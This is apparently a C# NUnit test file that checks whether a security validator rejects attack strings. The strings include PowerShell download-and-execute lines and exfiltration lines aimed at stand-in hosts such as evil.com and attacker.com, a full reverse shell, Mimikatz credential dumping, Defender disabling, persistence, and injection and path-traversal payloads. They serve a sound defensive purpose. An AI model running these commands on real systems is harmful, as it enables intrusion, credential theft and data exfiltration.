using System;
using NUnit.Framework;
using NecessaryAdminTool.Security;

// TAG: #SECURITY_CRITICAL #ATTACK_VECTOR_TESTING #OWASP_TOP_10 #VERSION_2_0
namespace NecessaryAdminTool.SecurityTests
{
    /// <summary>
    /// Attack vector tests based on OWASP Top 10 and common exploitation techniques
    /// Comprehensive testing of all known attack patterns
    /// TAG: #PENETRATION_TESTING #SECURITY_VALIDATION #THREAT_MODELING
    /// </summary>
    [TestFixture]
    public class AttackVectorTests
    {
        #region OWASP A03:2021 - Injection Attacks

        [TestFixture]
        public class InjectionAttackTests
        {
            [TestFixture]
            public class PowerShellInjectionAttacks
            {
                [Test]
                [TestCase("Get-Process; Remove-Item C:\\*")]
                [TestCase("Get-Service | ForEach-Object { Stop-Service $_.Name; Remove-Item C:\\* }")]
                [TestCase("Write-Host 'Hello' & whoami")]
                [TestCase("Get-Date && net user attacker password123 /add")]
                public void PowerShellInjection_CommandChaining_Blocked(string attack)
                {
                    Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(attack));
                }

                [Test]
                [TestCase("IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')")]
                [TestCase("Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW52b2tlLW1pbWlrYXR6')))")]
                [TestCase("&('I'+'EX') (wget http://evil.com)")]
                public void PowerShellInjection_DownloadAndExecute_Blocked(string attack)
                {
                    Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(attack));
                }

                [Test]
                [TestCase("powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAA=")]
                [TestCase("powershell -WindowStyle Hidden -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=")]
                public void PowerShellInjection_EncodedPayload_Blocked(string attack)
                {
                    Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(attack));
                }

                [Test]
                public void PowerShellInjection_Mimikatz_Blocked()
                {
                    var attacks = new[]
                    {
                        "Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"'",
                        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz",
                        "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
                    };

                    foreach (var attack in attacks)
                    {
                        Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(attack),
                            $"Mimikatz attack should be blocked: {attack}");
                    }
                }

                [Test]
                public void PowerShellInjection_ReverseShell_Blocked()
                {
                    var attacks = new[]
                    {
                        "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
                        "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('evil.com',443);$stream = $client.GetStream();\"",
                        "nc.exe -e cmd.exe attacker.com 4444"
                    };

                    foreach (var attack in attacks)
                    {
                        Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(attack),
                            $"Reverse shell should be blocked: {attack.Substring(0, Math.Min(100, attack.Length))}...");
                    }
                }
            }

            [TestFixture]
            public class LDAPInjectionAttacks
            {
                [Test]
                [TestCase("*")]
                [TestCase("*)(objectClass=*)")]
                [TestCase("*)(|(objectClass=*))")]
                [TestCase("*)(&(objectClass=*)")]
                public void LDAPInjection_WildcardBypass_Blocked(string attack)
                {
                    Assert.IsFalse(SecurityValidator.ValidateLDAPFilter(attack));
                }

                [Test]
                [TestCase("*)(uid=*)(&(objectClass=*)")]
                [TestCase("admin*)(|(uid=*))")]
                public void LDAPInjection_BooleanLogic_Blocked(string attack)
                {
                    Assert.IsFalse(SecurityValidator.ValidateLDAPFilter(attack));
                }

                [Test]
                public void LDAPInjection_SpecialCharsEscaped()
                {
                    var maliciousInputs = new[]
                    {
                        "*)(objectClass=*",
                        "admin*",
                        "(cn=*)",
                        "\\\\server\\share"
                    };

                    foreach (var input in maliciousInputs)
                    {
                        var escaped = SecurityValidator.EscapeLDAPSearchFilter(input);
                        // Check that special chars are hex-escaped
                        Assert.IsTrue(escaped.Contains("\\2a") || escaped.Contains("\\28") || escaped.Contains("\\29") || escaped.Contains("\\5c"),
                            $"Special characters should be escaped in: {input}");
                    }
                }

                [Test]
                public void LDAPInjection_NullByteInjection_Blocked()
                {
                    var attacks = new[]
                    {
                        "admin\0)(objectClass=*",
                        "user\0*",
                        "*))%00"
                    };

                    foreach (var attack in attacks)
                    {
                        Assert.IsFalse(SecurityValidator.ValidateLDAPFilter(attack),
                            $"Null byte injection should be blocked");
                    }
                }

                [Test]
                public void LDAPInjection_ParenthesisInjection_Blocked()
                {
                    var attacks = new[]
                    {
                        "admin)(|(cn=*))",
                        "user)(&(objectClass=*))",
                        "test))((cn=*"
                    };

                    foreach (var attack in attacks)
                    {
                        // Either validation blocks it or escaping neutralizes it
                        bool blocked = !SecurityValidator.ValidateLDAPFilter(attack);
                        var escaped = SecurityValidator.EscapeLDAPSearchFilter(attack);
                        bool neutralized = escaped.Contains("\\28") && escaped.Contains("\\29");

                        Assert.IsTrue(blocked || neutralized,
                            $"Parenthesis injection should be blocked or neutralized: {attack}");
                    }
                }
            }

            [TestFixture]
            public class CommandInjectionAttacks
            {
                [Test]
                [TestCase("SERVER01; whoami")]
                [TestCase("PC01 && net user")]
                [TestCase("WKS01 | findstr password")]
                [TestCase("HOST01 & shutdown /s /t 0")]
                public void CommandInjection_Separators_Blocked(string attack)
                {
                    Assert.IsFalse(SecurityValidator.IsValidComputerName(attack));
                }

                [Test]
                [TestCase("192.168.1.1; ping attacker.com")]
                [TestCase("10.0.0.1 && nc -e /bin/bash")]
                [TestCase("172.16.0.1 | tee /tmp/output")]
                public void CommandInjection_IPAddress_Blocked(string attack)
                {
                    Assert.IsFalse(SecurityValidator.IsValidIPAddress(attack));
                }

                [Test]
                [TestCase("server.com; curl evil.com")]
                [TestCase("web.local && wget malware.com")]
                [TestCase("db.corp | nc attacker.com 4444")]
                public void CommandInjection_Hostname_Blocked(string attack)
                {
                    Assert.IsFalse(SecurityValidator.IsValidHostname(attack));
                }

                [Test]
                public void CommandInjection_BacktickExecution_Sanitized()
                {
                    var attack = "test`whoami`";
                    var sanitized = SecurityValidator.SanitizeForPowerShell(attack);
                    Assert.IsFalse(sanitized.Contains("`"));
                }

                [Test]
                public void CommandInjection_DollarExpansion_Sanitized()
                {
                    var attack = "$(whoami)";
                    var sanitized = SecurityValidator.SanitizeForPowerShell(attack);
                    Assert.IsFalse(sanitized.Contains("$"));
                }
            }

            [TestFixture]
            public class SQLInjectionAttacks
            {
                // Note: These tests verify that input validation prevents SQL injection
                // Actual parameterized queries are tested elsewhere

                [Test]
                [TestCase("admin' OR '1'='1")]
                [TestCase("user'; DROP TABLE users--")]
                [TestCase("' UNION SELECT * FROM passwords--")]
                [TestCase("admin'--")]
                public void SQLInjection_UsernameField_InvalidatedOrSanitized(string attack)
                {
                    // Username validation should reject SQL injection attempts
                    bool isValid = SecurityValidator.ValidateUsername(attack);
                    Assert.IsFalse(isValid, $"SQL injection in username should be blocked: {attack}");
                }

                [Test]
                public void SQLInjection_SpecialCharsInUsername_Rejected()
                {
                    var sqlChars = new[] { "'", "\"", "--", ";", "/*", "*/" };
                    foreach (var sqlChar in sqlChars)
                    {
                        var username = $"admin{sqlChar}";
                        if (sqlChar != "'" && sqlChar != "\"") // Single quotes might be valid in names
                        {
                            Assert.IsFalse(SecurityValidator.ValidateUsername(username),
                                $"Username with SQL char should be rejected: {sqlChar}");
                        }
                    }
                }
            }

            [TestFixture]
            public class PathTraversalAttacks
            {
                [Test]
                [TestCase("..\\..\\..\\Windows\\System32\\config\\sam")]
                [TestCase("../../../etc/passwd")]
                [TestCase("..\\..\\..\\..\\boot.ini")]
                public void PathTraversal_DotDotSlash_Blocked(string attack)
                {
                    Assert.IsFalse(SecurityValidator.IsValidFilename(attack));
                }

                [Test]
                [TestCase("C:\\Windows\\System32\\config\\sam")]
                [TestCase("/etc/shadow")]
                [TestCase("\\\\server\\admin$\\sensitive.txt")]
                public void PathTraversal_AbsolutePath_Blocked(string attack)
                {
                    var tempDir = System.IO.Path.GetTempPath();
                    Assert.IsFalse(SecurityValidator.IsValidFilePath(attack, tempDir));
                }

                [Test]
                [TestCase("file/../../sensitive.txt")]
                [TestCase("folder\\..\\..\\config.ini")]
                public void PathTraversal_SlashInFilename_Blocked(string attack)
                {
                    Assert.IsFalse(SecurityValidator.IsValidFilename(attack));
                }

                [Test]
                public void PathTraversal_NormalizedPathOutsideBase_Blocked()
                {
                    var tempDir = System.IO.Path.GetTempPath();
                    var tempSubdir = System.IO.Path.Combine(tempDir, "testdir");

                    // Try to traverse out using normalization
                    var attack = System.IO.Path.Combine(tempSubdir, "..", "..", "Windows", "System32");

                    Assert.IsFalse(SecurityValidator.IsValidFilePath(attack, tempSubdir));
                }
            }
        }

        #endregion

        #region OWASP A07:2021 - Identification and Authentication Failures

        [TestFixture]
        public class AuthenticationAttackTests
        {
            [Test]
            public void BruteForce_RapidLoginAttempts_RateLimited()
            {
                var username = "bruteforce_" + Guid.NewGuid();
                int successCount = 0;

                // Attempt 20 rapid logins
                for (int i = 0; i < 20; i++)
                {
                    if (SecurityValidator.CheckRateLimit(username))
                        successCount++;
                }

                // Should only allow 5 attempts
                Assert.LessOrEqual(successCount, 5, "Brute force should be rate limited to 5 attempts");
            }

            [Test]
            public void BruteForce_ExponentialBackoff_IncreasesBlockTime()
            {
                var username = "backoff_" + Guid.NewGuid();

                // Exhaust attempts
                for (int i = 0; i < 5; i++)
                {
                    SecurityValidator.CheckRateLimit(username);
                }

                // Continue attempting (triggers exponential backoff)
                for (int i = 0; i < 5; i++)
                {
                    bool allowed = SecurityValidator.CheckRateLimit(username);
                    Assert.IsFalse(allowed, "All subsequent attempts should be blocked with exponential backoff");
                }
            }

            [Test]
            public void BruteForce_MultipleAccounts_EachRateLimitedIndependently()
            {
                var user1 = "user1_" + Guid.NewGuid();
                var user2 = "user2_" + Guid.NewGuid();

                // Exhaust user1
                for (int i = 0; i < 6; i++)
                {
                    SecurityValidator.CheckRateLimit(user1);
                }

                // user1 should be blocked
                Assert.IsFalse(SecurityValidator.CheckRateLimit(user1));

                // user2 should still be allowed
                Assert.IsTrue(SecurityValidator.CheckRateLimit(user2));
            }

            [Test]
            public void CredentialStuffing_UsernameEnumeration_Prevented()
            {
                // Rate limiting prevents username enumeration via timing attacks
                var validUser = "valid_" + Guid.NewGuid();
                var invalidUser = "invalid_" + Guid.NewGuid();

                // Both should behave the same way (rate limited after 5 attempts)
                for (int i = 0; i < 6; i++)
                {
                    SecurityValidator.CheckRateLimit(validUser);
                    SecurityValidator.CheckRateLimit(invalidUser);
                }

                Assert.IsFalse(SecurityValidator.CheckRateLimit(validUser));
                Assert.IsFalse(SecurityValidator.CheckRateLimit(invalidUser));
            }
        }

        #endregion

        #region OWASP A04:2021 - Insecure Design

        [TestFixture]
        public class InsecureDesignAttackTests
        {
            [Test]
            public void BusinessLogicBypass_MultipleValidationLayers()
            {
                // Test that bypassing one validation doesn't compromise security
                var maliciousInput = "admin; whoami";

                // Even if sanitization is bypassed, validation should catch it
                bool passedValidation = SecurityValidator.IsValidComputerName(maliciousInput);
                Assert.IsFalse(passedValidation, "Validation should catch malicious input even if sanitization fails");
            }

            [Test]
            public void PrivilegeEscalation_AdminEnumeration_Blocked()
            {
                var adminEnumeration = new[]
                {
                    "admin*",
                    "*admin*",
                    "administrator*"
                };

                foreach (var attempt in adminEnumeration)
                {
                    // LDAP filter validation should block admin enumeration
                    Assert.IsFalse(SecurityValidator.ValidateLDAPFilter(attempt),
                        $"Admin enumeration should be blocked: {attempt}");
                }
            }
        }

        #endregion

        #region Ransomware and Malware Attacks

        [TestFixture]
        public class MalwareAttackTests
        {
            [Test]
            public void Ransomware_FileEncryption_Blocked()
            {
                var ransomwareScripts = new[]
                {
                    "$aes = [System.Security.Cryptography.Aes]::Create(); $aes.GenerateKey();",
                    "New-Object System.Security.Cryptography.AesCryptoServiceProvider",
                    "$rij = New-Object System.Security.Cryptography.RijndaelManaged",
                    "[System.Security.Cryptography.Aes]::Create()"
                };

                foreach (var script in ransomwareScripts)
                {
                    Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script),
                        $"Ransomware encryption script should be blocked");
                }
            }

            [Test]
            public void Malware_Persistence_Blocked()
            {
                var persistenceScripts = new[]
                {
                    "New-ScheduledTask -TaskName 'Malware' -Action (New-ScheduledTaskAction -Execute 'malware.exe')",
                    "Register-ScheduledTask -TaskName 'Backdoor'",
                    "Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Malware' -Value 'C:\\bad.exe'",
                    "New-Service -Name 'Backdoor' -BinaryPathName 'C:\\malware.exe'"
                };

                foreach (var script in persistenceScripts)
                {
                    Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script),
                        $"Persistence mechanism should be blocked");
                }
            }

            [Test]
            public void Malware_AntivirusDisable_Blocked()
            {
                var avBypassScripts = new[]
                {
                    "Set-MpPreference -DisableRealtimeMonitoring $true",
                    "Disable-WindowsDefender",
                    "Set-MpPreference -DisableScriptScanning $true",
                    "Add-MpPreference -ExclusionPath 'C:\\Malware'"
                };

                foreach (var script in avBypassScripts)
                {
                    Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script),
                        $"Antivirus bypass should be blocked");
                }
            }

            [Test]
            public void Malware_DataExfiltration_Blocked()
            {
                var exfiltrationScripts = new[]
                {
                    "Invoke-WebRequest -Uri 'http://attacker.com/exfil' -Method POST -Body $data",
                    "(New-Object Net.WebClient).UploadString('http://evil.com', $secrets)",
                    "Start-BitsTransfer -Source C:\\sensitive.zip -Destination http://attacker.com/upload"
                };

                foreach (var script in exfiltrationScripts)
                {
                    Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script),
                        $"Data exfiltration should be blocked");
                }
            }
        }

        #endregion

        #region Advanced Evasion Techniques

        [TestFixture]
        public class EvasionTechniqueTests
        {
            [Test]
            public void Evasion_CaseVariation_StillBlocked()
            {
                var caseVariations = new[]
                {
                    "INVOKE-MIMIKATZ",
                    "InVoKe-MiMiKaTz",
                    "invoke-mimikatz",
                    "INVOKE-WEBREQUEST"
                };

                foreach (var variation in caseVariations)
                {
                    Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(variation),
                        $"Case variation should still be blocked: {variation}");
                }
            }

            [Test]
            public void Evasion_StringConcatenation_DetectedAsObfuscation()
            {
                var obfuscated = "I'+'E'+'X'";
                // Should be caught by obfuscation detection
                var script = $"&('{obfuscated}') (wget http://evil.com)";
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            public void Evasion_Base64Encoding_Detected()
            {
                var encoded = "[Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3Q=')";
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(encoded));
            }

            [Test]
            public void Evasion_CharArrayObfuscation_Detected()
            {
                var charArray = "[char[]]('73','69','88') -join ''";
                // Should trigger obfuscation score
                var script = $"$cmd = {charArray}; IEX $cmd";
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }

            [Test]
            public void Evasion_NullByteInjection_Blocked()
            {
                var nullByteAttacks = new[]
                {
                    "safe\0malicious",
                    "admin\0)(objectClass=*)",
                    "file.txt\0.exe"
                };

                // PowerShell sanitization should remove null bytes
                foreach (var attack in nullByteAttacks)
                {
                    var sanitized = SecurityValidator.SanitizeForPowerShell(attack);
                    Assert.IsFalse(sanitized.Contains("\0"), "Null bytes should be removed");
                }
            }

            [Test]
            public void Evasion_UnicodeHomoglyphs_Normalized()
            {
                // While we don't explicitly handle unicode homoglyphs,
                // dangerous commands should still be detected
                var script = "Invoke-WebRequest"; // Using actual characters
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
            }
        }

        #endregion

        #region Zero-Day Simulation Tests

        [TestFixture]
        public class ZeroDaySimulationTests
        {
            [Test]
            public void ZeroDay_NewPowerShellMalware_DetectedByPattern()
            {
                // Simulate new malware that uses common dangerous patterns
                var newMalware = @"
                    $wc = New-Object Net.WebClient;
                    $data = $wc.DownloadString('http://newmalware.com/payload.txt');
                    Invoke-Expression $data;
                ";

                // Should be caught by downloadstring and invoke-expression patterns
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(newMalware));
            }

            [Test]
            public void ZeroDay_NovelInjectionTechnique_BlockedByValidation()
            {
                // Even novel techniques should be blocked by strict validation
                var novelInjection = "SERVER01\u0000; whoami"; // Null byte separator
                Assert.IsFalse(SecurityValidator.IsValidComputerName(novelInjection));
            }

            [Test]
            public void ZeroDay_CombinationAttack_StoppedByMultipleValidations()
            {
                // Combination of LDAP injection + command injection
                var comboAttack = "*)(objectClass=*); whoami";

                // Should be blocked by multiple validation layers
                bool ldapBlocked = !SecurityValidator.ValidateLDAPFilter(comboAttack);
                bool cmdBlocked = !SecurityValidator.IsValidComputerName(comboAttack);

                Assert.IsTrue(ldapBlocked || cmdBlocked, "Combination attack should be blocked");
            }
        }

        #endregion
    }
}
